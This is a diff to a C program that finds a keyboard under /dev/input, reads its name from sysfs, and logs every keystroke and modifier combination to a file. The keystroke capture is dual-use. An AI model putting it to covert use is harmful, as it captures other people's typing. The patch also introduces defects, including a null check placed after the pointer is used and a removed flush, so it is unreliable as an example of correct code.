@@ -111,8 +111,8 @@ char *find_keyboard_device(const char *target_device_name) {
     struct dirent *ent;
     const char base_path[] = "/dev/input/";
 
-    if ((dir = opendir(base_path)) == NULL) {
-        fprintf(stderr, "Cannot access /dev/input\n");
+    if (!(dir = opendir(base_path))) {
+        printf("Cannot access /dev/input\n");
         return NULL;
     }
 
@@ -122,7 +122,7 @@ char *find_keyboard_device(const char *target_device_name) {
             snprintf(device_path, sizeof(device_path), "%s%s", base_path, ent->d_name);
             int fd = open(device_path, O_RDONLY);
             if (fd == -1) {
-                fprintf(stderr, "Cannot open device\n");
+                printf("Cannot open device\n");
                 continue;
             }
             char name[BUFFER_SIZE] = "Unknown";
@@ -145,55 +145,55 @@ char *find_keyboard_device(const char *target_device_name) {
 }
 
 char *get_keyboard_name(const char *path) {
-    char *c_path = mstrdup(path);
-    if ((strstr(path, "/dev/input/event") == NULL) || c_path == NULL) {
+    if (!strstr(path, "/dev/input/event") || !path) {
         fprintf(stderr, "Keyboard path must be in /dev/input/event*\n");
         return NULL;
     }
 
-    size_t len = strlen(c_path);
-    if (len > 0 && c_path[len - 1] == '/') {
-        c_path[len - 1] = '\0';
-    }
-
-    const char *last = strrchr(c_path, '/');
-    if (last == NULL) {
-        fprintf(stderr, "Invalid keyboard path %s\n", path);
-        free(c_path);
+    const char *last = strrchr(path, '/');
+    if (!last) {
+        printf("Invalid keyboard path %s\n", path);
         return NULL;
     }
 
-    const char *event_name = last + 1;
-    char sys_path[BUFFER_SIZE];
-    snprintf(sys_path, sizeof(sys_path), SYS_PATH_DEVICE_NAME, event_name);
+    const char *event = last + 1;
+    size_t sys_path_size = strlen(SYS_PATH_DEVICE_NAME) + strlen(event);
+    char *sys_path_buff = malloc(sys_path_size + 1);
+    if (!sys_path_buff) return NULL;
+    snprintf(sys_path_buff, sys_path_size + 1, SYS_PATH_DEVICE_NAME, event);
 
-    FILE *fp = fopen(sys_path, "r");
-    if (fp == NULL) {
-        fprintf(stderr, "Failed to open sys device name\n");
-        free(c_path);
+    FILE *file = fopen(sys_path_buff, "r");
+    if (!file) {
+        printf("Failed to open sys device name\n");
+        free(sys_path_buff);
         return NULL;
     }
 
-    char keyboard_name[KEY_MAP_SIZE];
-    if (fgets(keyboard_name, sizeof(keyboard_name), fp) == NULL) {
-        free(c_path);
-        fclose(fp);
+    free(sys_path_buff);
+
+    char tmp[256];
+    if (!fgets(tmp, sizeof(tmp), file)) {
+        fclose(file);
         return NULL;
     }
+    size_t keyboard_name_size = strlen(tmp);
+    tmp[keyboard_name_size - 1] = '\0';
 
-    free(c_path);
-    fclose(fp);
+    fclose(file);
 
-    keyboard_name[strcspn(keyboard_name, "\n")] = '\0';
-    return mstrdup(keyboard_name);
+    char *keyboard_name_buff = malloc(keyboard_name_size + 1);
+    if (!keyboard_name_buff) return NULL;
+    strncpy(keyboard_name_buff, tmp, keyboard_name_size + 1);
+
+    return keyboard_name_buff;
 }
 
 void log_key(FILE *fp, BehaviorSubject *subject, bool ctrl_pressed, bool meta_pressed, bool alt_pressed,
              const char *key_name) {
-    char combined_key[MAX_KEY_LEN] = {0};
+    char combined_key[MAX_KEY_LEN];
+    combined_key[0] = '\0';
     bool is_modifier = (strcmp(key_name, "Shift") == 0 || strcmp(key_name, "Ctrl") == 0 ||
                         strcmp(key_name, "Meta") == 0 || strcmp(key_name, "Alt") == 0);
-
     if (is_modifier) {
         next(subject, key_name);
         fprintf(fp, "%s\n", key_name);
@@ -205,7 +205,4 @@ void log_key(FILE *fp, BehaviorSubject *subject, bool ctrl_pressed, bool meta_pr
         next(subject, combined_key);
         fprintf(fp, "%s\n", combined_key);
     }
-
-    fflush(fp);
-    memset(combined_key, 0, sizeof(combined_key));
 }
